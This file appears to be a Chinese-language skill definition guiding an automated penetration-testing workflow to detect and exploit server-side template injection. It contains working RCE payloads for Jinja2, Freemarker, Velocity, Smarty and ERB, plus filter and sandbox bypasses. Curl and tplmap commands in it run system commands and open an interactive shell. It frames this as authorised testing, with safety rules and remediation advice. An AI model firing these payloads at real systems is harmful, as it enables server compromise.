---
name: ssti
description: SSTI 检测技能 —— 面向模板渲染系统，定位用户输入直接拼接到模板引擎上下文的端点，通过注入模板语法（{{7*7}} ${7*7} <%=7*7%>）触发服务端计算或代码执行，产生可复现 PoC
phase: test
severity_focus: critical
---

# 服务端模板注入检测技能（SSTI）

> 定位：面向**模板渲染应用**的 SSTI 漏洞，不是 XSS 扫描器。核心在于「识别哪些输入会被模板引擎解析」并「证明攻击者可通过注入模板语法执行服务端代码」—— 重点检测模板语法渲染（Jinja2/FreeMarker/Velocity/Smarty/Thymeleaf/ERB 等），而非简单的 HTML 注入。

## 漏洞原理

SSTI（Server-Side Template Injection）的本质是：Web 应用在渲染模板时，**直接将用户可控的输入拼接到模板上下文，未做过滤或转义，导致模板引擎将其解析为模板语法而非普通文本**。

- **模板语法注入**：当用户输入被拼接到模板中时，注入的模板语法会被服务端执行。例如：
  - Jinja2: `{{7*7}}` → 渲染为 `49`
  - Freemarker: `${7*7}` → 渲染为 `49`
  - ERB (Ruby): `<%=7*7%>` → 渲染为 `49`
  - Smarty: `{7*7}` → 渲染为 `49`
  - Velocity: `#set($x=7*7)${x}` → 渲染为 `49`
- **对象访问注入**：通过注入点访问模板上下文中的对象，进一步获取敏感信息或执行代码：
  - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
  - Freemarker: `${"freemarker.template.utility.Execute"?new()("id")}`
  - Velocity: `#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')`
- **沙箱绕过**：部分模板引擎有沙箱限制，攻击者通过访问对象的特殊属性或方法绕过限制，最终达成 RCE。

**关键判断依据**：提交模板语法 Payload 后，服务端响应中包含计算结果（如 `49`）或特征输出，确认模板引擎解析了注入的语法。

## 触发条件

满足以下任一信号即应进入本技能（侦查阶段 `endpoints.json` 标注了候选 SSTI 端点）：

- 端点接受用户输入并在响应中原样返回：URL 参数、表单字段、Cookie 值、HTTP 头的值出现在响应页面。
- 输入值被拼接到错误页面：如 404 页面显示 `Not found: {{7*7}}` → 渲染为 `Not found: 49`。
- 输入值出现在邮件内容、PDF 导出、HTML 模板渲染中：用户可控内容被用于模板渲染场景。
- 框架特征明显：应用使用 Flask/Django（Jinja2）、Spring MVC（Thymeleaf/FreeMarker）、Ruby on Rails（ERB）、PHP（Smarty/Twig）等模板引擎。
- 输入点名称暗示渲染：`template`、`view`、`render`、`format`、`layout`、`content`、`message`、`greeting`、`name`、`username` 等参数。

## 检测方法

> 流程：输入点识别 → 注入多语法 Payload → 观察响应渲染 → 确认模板引擎 → 构造利用链

### 步骤一：输入点筛选

1. **抓包分析**：使用 Burp Suite 或浏览器开发者工具，遍历应用的所有输入点（URL 参数、POST 参数、Cookie、HTTP 头）。
2. **筛选标准**：
   - 输入值出现在响应页面中（反射型）或存储后再次显示（存储型）。
   - 输入值被拼接到错误消息、问候语、邮件内容、导出文件中。
   - 参数名称暗示模板渲染（`template`、`view`、`render`、`message`、`name` 等）。
3. **记录候选清单**：端点、参数、请求方法、输入位置（URL/Body/Cookie/Header）。

### 步骤二：多语法 Payload 注入

核心验证动作——证明「输入被模板引擎解析」。

1. **基础计算 Payload**：在输入点提交以下 Payload，观察响应：
   ```
   {{7*7}}
   ${7*7}
   <%=7*7%>
   {7*7}
   ${{7*7}}
   #[[7*7]]
   ```

2. **成功判断**：
   - 响应中出现 `49` 或其他计算结果。
   - 响应中 Payload 部分被替换、删除或格式化（如 `{{7*7}}` 变为空或错误信息）。
   - 响应时间异常（如注入延时语法 `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` 导致 5 秒延迟）。

3. **若无变化**：尝试在 Payload 前后添加闭合语法（如 `{{7*7}}}}`、`${{7*7}}`），或测试不同参数。

### 步骤三：模板引擎指纹识别

确认存在 SSTI 后，识别具体的模板引擎类型。

1. **语法特征识别**：根据哪些 Payload 成功渲染判断：
   - `{{7*7}}` 成功 → Jinja2（Flask/Django）、Twig（PHP）
   - `${7*7}` 成功 → Freemarker（Java）、Velocity（Java）、Spring EL
   - `<%=7*7%>` 成功 → ERB（Ruby on Rails）
   - `{7*7}` 成功 → Smarty（PHP）

2. **环境变量注入**：注入访问环境对象的语法获取系统信息：
   - Jinja2: `{{config.items()}}` → 返回配置信息
   - Freemarker: `${.globals}` → 返回全局变量
   - Velocity: `$context` → 返回上下文对象

3. **错误信息分析**：观察模板解析错误，错误消息中常包含引擎名称和版本。

### 步骤四：RCE 利用链构造

确认引擎类型后，构造 RCE Payload 证明漏洞危害。

- **Jinja2 (Python) RCE**：
  ```
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}
  ```

- **Freemarker (Java) RCE**：
  ```
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```

- **Velocity (Java) RCE**：
  ```
  #set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
  ```

- **Smarty (PHP) RCE**：
  ```
  {php}system('id');{/php}
  {if phpinfo()}{/if}
  ```

- **ERB (Ruby) RCE**：
  ```
  <%=system('id')%>
  ```

## 三层测试模型

> 对齐 DESIGN §3.1：L1 快速筛选候选 → L2 确认可利用 → L3 证明 RCE 能力

### L1 探测

目标：快速识别哪些输入点存在模板语法渲染，不做完整利用。

- **批量多语法注入**：对所有输入点批量提交 `{{7*7}}\n${7*7}\n<%=7*7%>`，观察哪些端点响应出现 `49`。
- **响应差异分析**：对比注入前后的响应差异，检测 Payload 是否被解析（长度变化、内容替换）。
- **参数名筛选**：优先测试 `template`、`view`、`render`、`message`、`name` 等暗示渲染的参数。

### L2 验证

目标：对 L1 筛选出的候选点，通过精确 Payload 确认 SSTI 存在。

- **单语法验证**：对每个候选点分别测试不同模板引擎的语法，确认具体引擎类型。
- **对象访问测试**：注入 `{{config}}`、`${.globals}` 等访问上下文对象的语法，验证是否能获取环境信息。
- **影响评估**：根据可访问的对象和执行能力定级——RCE 为 critical，信息泄露为 high，计算能力为 medium。

### L3 绕过

目标：当基础 Payload 被过滤时，测试绕过方法。

- **编码绕过**：对 Payload 进行 URL 编码、Unicode 编码、十六进制编码。
- **注释绕过**：在语法中插入注释字符绕过 WAF（如 `{ {7*7} }`、`{{""["\x5f\x5fclass\x5f\x5f"]}}`）。
- **混合语法**：结合多种语法（如 `${{{7*7}}}`）绕过单一语法过滤。
- **沙箱绕过**：使用属性链绕过沙箱限制（如 Jinja2 的 `__mro__`、`__subclasses__` 链）。

## 工具

### curl（命令行注入测试）

```bash
# 基础 SSTI 检测
curl -G 'https://target.com/search' \
  --data-urlencode 'q={{7*7}}' \
  -H 'Cookie: session=USER_SESSION'

# POST 参数 SSTI
curl -X POST 'https://target.com/api/message' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=USER_SESSION' \
  -d 'message={{7*7}}&username=test'

# Cookie SSTI
curl 'https://target.com/profile' \
  -H 'Cookie: user_pref={{7*7}}; session=USER_SESSION'

# Jinja2 RCE Payload
curl -G 'https://target.com/search' \
  --data-urlencode 'q={{config.__class__.__init__.__globals__["os"].popen("id").read()}}'

# Freemarker RCE Payload
curl -G 'https://target.com/view' \
  --data-urlencode 'template=${"freemarker.template.utility.Execute"?new()("id")}'
```

### tplmap（自动化 SSTI 检测工具）

```bash
# 基础扫描
tplmap -u 'https://target.com/search?q=TEST'

# POST 参数扫描
tplmap -u 'https://target.com/api/message' -d 'message=TEST&username=test'

# Cookie 扫描
tplmap -u 'https://target.com/profile' -H 'Cookie: user_pref=TEST'

# 指定引擎
tplmap -u 'https://target.com/search?q=TEST' --engine=jinja2

# 执行命令
tplmap -u 'https://target.com/search?q=TEST' --os-cmd='id'

# 获取交互 Shell
tplmap -u 'https://target.com/search?q=TEST' --os-shell
```

### Burp Suite（抓包与重放）

1. Proxy → Intercept 捕获请求。
2. Send to Repeater，在参数值位置注入 SSTI Payload。
3. 观察响应中是否出现 `49` 或其他渲染结果。
4. 使用 Intruder 批量测试多个 Payload 和多个参数。

## 输出格式

每个确认的 SSTI 漏洞按以下 Finding 结构输出（result 初值 `validation_inconclusive`，留待校验流水线）：

```json
{
  "id": "SSTI-001",
  "type": "ssti",
  "severity": "critical",
  "status": "confirmed",
  "result": "validation_inconclusive",
  "title": "搜索接口存在 Jinja2 SSTI 漏洞，可执行任意系统命令",
  "endpoint": "GET /search",
  "description": "该端点的 q 参数被直接拼接到 Jinja2 模板上下文，攻击者可注入模板语法 {{7*7}} 被渲染为 49，进一步可访问 config 对象执行系统命令，获取服务器权限",
  "payload": {
    "method": "GET",
    "url": "/search",
    "parameter": "q",
    "headers": {
      "Cookie": "session=USER_SESSION"
    },
    "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "engine": "Jinja2"
  },
  "verification_steps": [
    "1. 访问 /search?q={{7*7}}，观察响应中是否出现 49",
    "2. 访问 /search?q={{config.items()}}，确认能访问 config 对象",
    "3. 访问 /search?q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}，验证命令执行",
    "4. 使用 tplmap 自动化确认漏洞并获取交互 Shell",
    "5. 构造完整的 RCE Payload 证明可获取服务器权限"
  ],
  "evidence": {
    "response_status": 200,
    "payload": "{{7*7}}",
    "rendered": "49",
    "engine": "Jinja2",
    "rce_confirmed": true,
    "command_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
  },
  "remediation": "禁止将用户输入直接拼接到模板上下文，使用模板引擎提供的参数化渲染方法（如 Jinja2 的 context.render(param=value)），对用户输入进行严格的类型验证和转义"
}
```

## 证据要求

什么才算确认 SSTI（禁止仅凭「响应包含 49」下结论，要证明模板语法被服务端解析）：

1. **语法渲染成功**：注入模板语法 Payload 后，响应中出现计算结果（`{{7*7}}` → `49`）或对象信息（`{{config}}` → 配置字典），这是核心判据。
2. **引擎类型确认**：通过多个 Payload 确认具体的模板引擎类型（Jinja2/Freemarker/ERB 等），而非模糊判断。
3. **RCE 能力证明**：通过命令执行 Payload 获取系统信息（如 `id`、`whoami`、`cat /etc/passwd`），证明具备代码执行能力。
4. **影响说明**：注明该 SSTI 能执行的操作类型（RCE/信息泄露/文件读写）和是否需要用户交互，据此定级。
5. **证据脱敏**：请求中的会话 Cookie / 系统命令输出中的敏感信息在证据中脱敏；只记录「命令执行成功 + 脱敏输出」，不原文。

## 禁止事项

- **仅授权目标**：SSTI 检测涉及命令执行，必须在书面授权范围内操作；检测前与委托方确认哪些端点允许实际执行命令、哪些只能做语法验证。
- **不破坏真实数据**：优先使用只读命令（`id`、`whoami`、`ls /tmp`）；若必须测试写操作，选择测试目录或使用标记值便于回溯清理。
- **不对真实用户发起 SSTI**：SSTI Payload 只在自有测试环境或测试账户间验证，绝不诱导真实用户访问含 SSTI Payload 的链接。
- **凭证不落明文**：检测中获取的系统信息、数据库连接字符串、API 密钥等敏感凭证，证据只记录类型与存在性，不存原文。
- **不执行破坏性命令**：禁止执行 `rm -rf`、`dd`、`mkfs` 等破坏性命令；禁止对生产环境执行高负载命令（如 `fork bomb`）。
